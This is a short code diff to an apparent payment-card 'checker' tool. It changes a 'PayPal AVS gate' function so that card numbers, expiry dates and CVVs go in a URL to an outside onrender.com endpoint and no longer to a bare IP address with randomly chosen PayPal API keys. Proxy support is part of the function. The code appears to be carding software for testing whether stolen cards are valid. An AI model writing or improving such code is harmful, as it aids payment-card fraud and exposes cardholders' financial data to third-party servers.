@@ -502,10 +502,8 @@ async def check_paypal_render(card: str, month: str, year: str, cvv: str, proxy=
 
 async def check_paypal_avs(card: str, month: str, year: str, cvv: str, proxy=None, client_id=None, client_secret=None) -> dict:
     """PayPal Key-Based AVS Gate (Cyborx Port)"""
-    if not client_id or not client_secret:
-        client_id, client_secret = random.choice(PAYPAL_KEYS)
-    
-    url = f"http://206.206.78.217:1355/?cc={card}|{month}|{year}|{cvv}&client_id={client_id}&client_secret={client_secret}"
+    # Redirect to Render API which is working
+    url = f"https://paypal0-1.onrender.com/gate=pp1/cc={card}|{month}|{year}|{cvv}"
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(url, proxy=proxy, timeout=50) as resp:
